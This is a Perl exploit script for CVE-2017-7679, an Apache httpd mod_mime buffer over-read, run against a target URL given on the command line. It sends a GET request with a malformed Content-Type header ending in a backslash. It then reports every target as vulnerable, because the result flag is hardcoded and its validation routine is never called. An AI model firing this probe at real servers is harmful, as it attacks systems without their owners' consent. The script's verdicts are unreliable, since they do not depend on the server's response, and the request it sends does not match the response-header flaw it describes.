#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;

# Global Variables
my $url = 0;
$url = $ARGV[0] or help();

# Display The Header
header();

# Run The PoC
exploit($url);


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2017-7679 ]=================================";
    
    print qq{
$title
            
   Reporter : ChenQin and Hanno BÃ¶ck
       Date : 2017-06-20
        CVE : CVE-2017-7679
            
Description :

In Apache httpd 2.2.x before 2.2.33 and 2.4.x before 2.4.26, mod_mime
can read one byte past the end of a buffer when sending a malicious
Content-Type response header.


};
    print "="x(length($title)) . "\n\n";
}

sub help {
    print "\n";
    print qq {  
        # Usage : perl $0 <url>        
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my ( $url ) = @_;
    my $browser = 0;
    my $useragent = '';
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $vulnerable = 1;
    my $timeout = 30;
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Build/send the requests

  # Request : EXPLOIT1
  print "[*] Sending GET Request With Malicious Content-Type Header On : /\n";
  $request = buildRequest($url . "", "GET", "", "application/x-www-form-urlencoded\\");
  $response = $browser->request($request);
  print "\t => " . $request->uri . " (" . $response->code . ")\n\n";
    
    
    ### Validate or not the test
    if($vulnerable) {
        print "[VULNERABLE] $url is affected or any kind of validation was provided.\n";
    } else {
        print "[NOT VULNERABLE] $url is not affected.\n";
    }
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) { return $positive if($response->header($validation_value)); }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        return $positive;
    }
    
    return 0;
}
